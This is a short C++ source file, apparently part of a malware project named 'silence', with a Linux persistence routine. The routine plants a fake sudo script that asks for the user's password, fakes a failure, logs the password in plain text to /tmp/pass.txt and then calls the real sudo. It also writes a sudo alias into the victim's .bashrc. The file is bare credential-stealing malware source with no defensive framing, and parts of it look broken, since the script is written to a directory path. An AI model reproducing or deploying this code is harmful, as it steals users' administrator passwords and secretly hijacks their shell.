#ifdef __linux__

#include <core/linux/System.h>

namespace silence::impl {
    std::string username() {
        return getlogin();
    }

    void persist() {
        std::filesystem::path homePath = "/home/" + username();

        std::string fakeSudo = R"(
        read -sp "[sudo] password for $USER: " sudopass
        echo ""
        sleep 2
        echo "Sorry, try again."
        echo $sudopass >> /tmp/pass.txt

        /usr/bin/sudo $@)";

        system(("chmod u+x " + homePath.string() + "/.config/sudocfg").c_str());
        system(("echo \"alias sudo=" + homePath.string() + "/.config/sudocfg\" >> " + homePath.string() +
                "/.bashrc").c_str());
        system(("echo \"" + fakeSudo + "\" >> " + homePath.string() + "/.config/").c_str());
    }
}

#endif